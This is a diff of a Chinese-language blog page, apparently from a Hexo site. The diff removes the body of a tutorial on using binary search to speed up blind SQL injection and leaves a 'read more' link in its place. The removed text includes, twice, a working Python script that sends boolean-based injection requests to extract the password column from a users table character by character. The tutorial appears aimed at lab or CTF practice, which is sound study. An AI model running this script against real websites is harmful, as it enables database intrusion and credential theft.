@@ -362,57 +362,9 @@
   <div class="article-entry" itemprop="articleBody">
     
     <h1 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h1><p>相较于一个一个字母测试sql注入的python脚本来说，二分法可以带来更高效的，更全面的结果。</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先来看一个脚本的片段</p>
-<pre><code>for i in range(1,10000):
-    low = 32
-    high = 128
-    mid = (low+high)//2
-    while low &lt; high:
-     #   url = host + &quot;id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&lt;%d)^1&quot; % (i,mid)
-     #  res = requests.get(url)
-        url = host + &quot;id=1&#39;^(ascii(substr((select(group_concat(password))from(users)),%d,1))&lt;%d)^1-- -&quot; % (i,mid)
-        res = requests.get(url)
-        if &quot;You are in&quot; in res.text:
-            high = mid
-        else:
-            low = mid+1
-        mid = (low + high)&gt;&gt;1
-    if mid &lt;= 32 or mid &gt;= 127:
-        break
-</code></pre>
-<p>这个脚本是把二分法应用到sql盲注中。</p>
-<ul>
-<li><p>过程：</p>
-</li>
-<li><p>（1）查找范围</p>
-<pre><code>   low = 32
-   high = 128
-</code></pre>
-<p>对照ascii码表从32位（空格）到128位（€欧盟的符号），其中包含了数字，大小写字母，及部分常见符号，范围很广。</p>
-</li>
-</ul>
-<p>（2）查找过程</p>
-<p>除了最高位和最低位，还设置了一个中间值。</p>
-<p><img src="https://s2.loli.net/2022/02/13/tpHWNE9lIUr4Zi7.png" alt="图片.png"></p>
-<p>定义完变量，开始测试。</p>
-<pre><code>for i in range(1,10000):
-    low = 32
-    high = 128
-    mid = (low+high)//2
-    while low &lt; high:
-        url = host + &quot;id=1&#39;^(ascii(substr((select(group_concat(password))from(users)),%d,1))&lt;%d)^1-- -&quot; % (i,mid)
-        res = requests.get(url)
-        if &quot;You are in&quot; in res.text:
-                   high = mid
-        else:
-                   low = mid+1
-                   mid = (low + high)&gt;&gt;1
-        if mid &lt;= 32 or mid &gt;= 127:
-                   break
-</code></pre>
-<p>判断password的第i位是否小于mid，如果出现页面回显”You are in”（代表小于），然后把mid的值赋给high；如果页面回显出其他东西（代表大于），则把mid加1的值赋值给low。然后mid再重新计算（mid = (low + high)&gt;&gt;1，low和high的总和向右位移1位，可以相当于这个总和除二）。通过while循环把查找的范围不断缩小，不断接近所要查找的那个值，最后high等于low等于所要查找的那个值，不满足while low &lt; high跳出循环，打印出找到的那个值。<br><img src="https://s2.loli.net/2022/02/13/OToAwxQm3rat5lg.png" alt="图片.png"></p>
-<p>如果把上述的low=mid+1改为low=mid也可以<br><img src="https://s2.loli.net/2022/02/13/1wIqXdCRMNyOEz5.png" alt="图片.png"></p>
-
+    
+    <a class="article-more-a" href="/2022/02/05/sql%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC%E2%80%94%E2%80%94%E4%BA%8C%E5%88%86%E6%B3%95/#more">more >></a>
+    
     
 
     
